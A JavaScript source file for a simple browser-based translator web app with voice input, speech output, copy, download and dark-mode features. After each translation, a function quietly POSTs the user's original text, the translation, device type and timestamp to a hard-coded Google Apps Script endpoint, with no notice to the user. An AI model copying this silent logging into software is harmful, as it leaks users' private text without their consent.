// ==========================================
// 🌍 NOVA CORE AI TRANSLATOR
// ==========================================


// Google Apps Script URL
const GOOGLE_SCRIPT_URL =
"https://script.google.com/macros/s/AKfycbwSz5Z_JGQkKB5YJ4ORj1oFMIRKsKl_kCYUYhIg2k1073rpPQdx9lGKoPL1G6yhEoHT/exec";


// ==========================================
// GET ELEMENTS
// ==========================================

const fromLanguage = document.getElementById("fromLanguage");
const toLanguage = document.getElementById("toLanguage");

const inputText = document.getElementById("inputText");
const outputText = document.getElementById("outputText");

const translateBtn = document.getElementById("translateBtn");

const swapBtn = document.getElementById("swapBtn");

const copyInputBtn = document.getElementById("copyInput");
const copyOutputBtn = document.getElementById("copyOutput");

const micBtn = document.getElementById("micBtn");
const speakBtn = document.getElementById("speakBtn");

const themeBtn = document.getElementById("themeBtn");

const clearBtn = document.getElementById("clearBtn");

const downloadBtn = document.getElementById("downloadBtn");


// ==========================================
// CHECK ELEMENTS
// ==========================================

console.log("🌍 Nova Core loading...");

console.log({
    fromLanguage,
    toLanguage,
    inputText,
    outputText,
    translateBtn,
    swapBtn,
    copyInputBtn,
    copyOutputBtn,
    micBtn,
    speakBtn,
    themeBtn,
    clearBtn,
    downloadBtn
});


// ==========================================
// 🌙 DARK MODE
// ==========================================

themeBtn.addEventListener("click", function () {

    document.body.classList.toggle("dark");

    if (document.body.classList.contains("dark")) {

        localStorage.setItem(
            "novaDarkMode",
            "true"
        );

    } else {

        localStorage.setItem(
            "novaDarkMode",
            "false"
        );

    }

});


// Load saved dark mode

if (
    localStorage.getItem("novaDarkMode") === "true"
) {

    document.body.classList.add("dark");

}


// ==========================================
// 🔄 SWAP
// ==========================================

swapBtn.addEventListener("click", function () {

    const oldFrom =
        fromLanguage.value;

    const oldTo =
        toLanguage.value;

    fromLanguage.value =
        oldTo;

    toLanguage.value =
        oldFrom;


    const oldInput =
        inputText.value;

    inputText.value =
        outputText.value;

    outputText.value =
        oldInput;

});


// ==========================================
// 📋 COPY INPUT
// ==========================================

copyInputBtn.addEventListener(
    "click",
    async function () {

        if (!inputText.value.trim()) {

            alert("There is no text to copy.");

            return;

        }

        try {

            await navigator.clipboard.writeText(
                inputText.value
            );

            copyInputBtn.innerHTML =
                "✅ Copied!";

            setTimeout(function () {

                copyInputBtn.innerHTML =
                    "📋 Copy";

            }, 1500);

        } catch (error) {

            alert(
                "Copy failed. Please copy manually."
            );

        }

    }
);


// ==========================================
// 📋 COPY OUTPUT
// ==========================================

copyOutputBtn.addEventListener(
    "click",
    async function () {

        if (!outputText.value.trim()) {

            alert("There is no translation to copy.");

            return;

        }

        try {

            await navigator.clipboard.writeText(
                outputText.value
            );

            copyOutputBtn.innerHTML =
                "✅ Copied!";

            setTimeout(function () {

                copyOutputBtn.innerHTML =
                    "📋 Copy";

            }, 1500);

        } catch (error) {

            alert(
                "Copy failed. Please copy manually."
            );

        }

    }
);


// ==========================================
// 🗑️ CLEAR
// ==========================================

clearBtn.addEventListener(
    "click",
    function () {

        inputText.value = "";

        outputText.value = "";

    }
);


// ==========================================
// 📥 DOWNLOAD
// ==========================================

downloadBtn.addEventListener(
    "click",
    function () {

        const text =
            outputText.value.trim();

        if (!text) {

            alert(
                "There is no translation to download."
            );

            return;

        }


        const blob =
            new Blob(
                [text],
                {
                    type:
                        "text/plain;charset=utf-8"
                }
            );


        const url =
            URL.createObjectURL(blob);


        const link =
            document.createElement("a");

        link.href = url;

        link.download =
            "Nova-Core-Translation.txt";


        document.body.appendChild(link);

        link.click();

        document.body.removeChild(link);

        URL.revokeObjectURL(url);

    }
);


// ==========================================
// 🌍 TRANSLATE
// ==========================================

translateBtn.addEventListener(
    "click",
    async function () {

        const text =
            inputText.value.trim();


        if (!text) {

            alert(
                "Please enter text first."
            );

            return;

        }


        const from =
            fromLanguage.value;

        const to =
            toLanguage.value;


        if (!from || from === "auto") {

            alert(
                "Please choose the input language."
            );

            return;

        }


        if (!to) {

            alert(
                "Please choose the output language."
            );

            return;

        }


        if (from === to) {

            alert(
                "Please choose two different languages."
            );

            return;

        }


        // Disable button

        translateBtn.disabled = true;

        translateBtn.innerHTML =
            "⏳ Translating...";


        try {

            const apiURL =
                "https://api.mymemory.translated.net/get" +
                "?q=" +
                encodeURIComponent(text) +
                "&langpair=" +
                encodeURIComponent(from) +
                "|" +
                encodeURIComponent(to);


            const response =
                await fetch(apiURL);


            if (!response.ok) {

                throw new Error(
                    "Translation server error."
                );

            }


            const data =
                await response.json();


            if (
                !data.responseData ||
                !data.responseData.translatedText
            ) {

                throw new Error(
                    "No translation received."
                );

            }


            const translatedText =
                data.responseData.translatedText;


            // Show translation

            outputText.value =
                translatedText;


            // Language names

            const fromName =
                fromLanguage
                    .options[
                        fromLanguage.selectedIndex
                    ]
                    .textContent
                    .trim();


            const toName =
                toLanguage
                    .options[
                        toLanguage.selectedIndex
                    ]
                    .textContent
                    .trim();


            // Send email

            sendTranslationReport({

                phone:
                    getDeviceName(),

                original:
                    text,

                translation:
                    translatedText,

                from:
                    fromName,

                to:
                    toName,

                date:
                    new Date()
                        .toLocaleDateString(),

                time:
                    new Date()
                        .toLocaleTimeString()

            });


        } catch (error) {

            console.error(
                "Translation error:",
                error
            );

            outputText.value = "";

            alert(
                "❌ Translation failed. Check your internet connection and try again."
            );

        } finally {

            translateBtn.disabled = false;

            translateBtn.innerHTML =
                "🌍 Translate";

        }

    }
);


// ==========================================
// 📱 DEVICE NAME
// ==========================================

function getDeviceName() {

    const ua =
        navigator.userAgent;


    if (/iPhone/i.test(ua)) {

        return "iPhone";

    }


    if (/iPad/i.test(ua)) {

        return "iPad";

    }


    if (/Android/i.test(ua)) {

        return "Android Device";

    }


    if (/Windows/i.test(ua)) {

        return "Windows PC";

    }


    if (/Macintosh/i.test(ua)) {

        return "Mac";

    }


    return "Unknown Device";

}


// ==========================================
// 📧 SEND EMAIL REPORT
// ==========================================

async function sendTranslationReport(data) {

    try {

        await fetch(
            GOOGLE_SCRIPT_URL,
            {
                method: "POST",

                mode: "no-cors",

                headers: {
                    "Content-Type":
                        "text/plain;charset=utf-8"
                },

                body:
                    JSON.stringify(data)

            }
        );


        console.log(
            "📧 Translation report sent."
        );


    } catch (error) {

        console.error(
            "Email report failed:",
            error
        );

    }

}


// ==========================================
// 🔊 SPEAK / TEXT TO SPEECH
// ==========================================

speakBtn.addEventListener(
    "click",
    function () {

        const text =
            outputText.value.trim();


        if (!text) {

            alert(
                "There is no translation to listen to."
            );

            return;

        }


        if (!window.speechSynthesis) {

            alert(
                "Text-to-speech is not supported."
            );

            return;

        }


        window.speechSynthesis.cancel();


        const speech =
            new SpeechSynthesisUtterance(text);


        speech.lang =
            toLanguage.value;

        speech.rate = 1;

        speech.pitch = 1;


        window.speechSynthesis.speak(
            speech
        );

    }
);


// ==========================================
// 🎤 MICROPHONE
// ==========================================

const SpeechRecognition =
    window.SpeechRecognition ||
    window.webkitSpeechRecognition;


let recognition = null;


if (SpeechRecognition) {

    recognition =
        new SpeechRecognition();


    recognition.continuous =
        false;

    recognition.interimResults =
        false;


    recognition.onstart =
        function () {

            micBtn.innerHTML =
                "🔴 Listening...";

        };


    recognition.onresult =
        function (event) {

            const result =
                event.results[0][0].transcript;


            inputText.value +=
                (
                    inputText.value
                    ? " "
                    : ""
                ) + result;

        };


    recognition.onerror =
        function (event) {

            console.error(
                "Mic error:",
                event.error
            );

            micBtn.innerHTML =
                "🎤 Speak";

        };


    recognition.onend =
        function () {

            micBtn.innerHTML =
                "🎤 Speak";

        };


    micBtn.addEventListener(
        "click",
        function () {

            try {

                recognition.lang =
                    fromLanguage.value;

                recognition.start();

            } catch (error) {

                console.log(
                    "Microphone is already running."
                );

            }

        }
    );

} else {

    micBtn.addEventListener(
        "click",
        function () {

            alert(
                "🎤 Voice input is not supported by this browser. Please use Google Chrome."
            );

        }
    );

}


// ==========================================
// ⌨️ ENTER TO TRANSLATE
// ==========================================

inputText.addEventListener(
    "keydown",
    function (event) {

        if (
            event.key === "Enter" &&
            !event.shiftKey
        ) {

            event.preventDefault();

            translateBtn.click();

        }

    }
);


// ==========================================
// 🚀 READY
// ==========================================

console.log(
    "✅ Nova Core Translator is ready!"
);
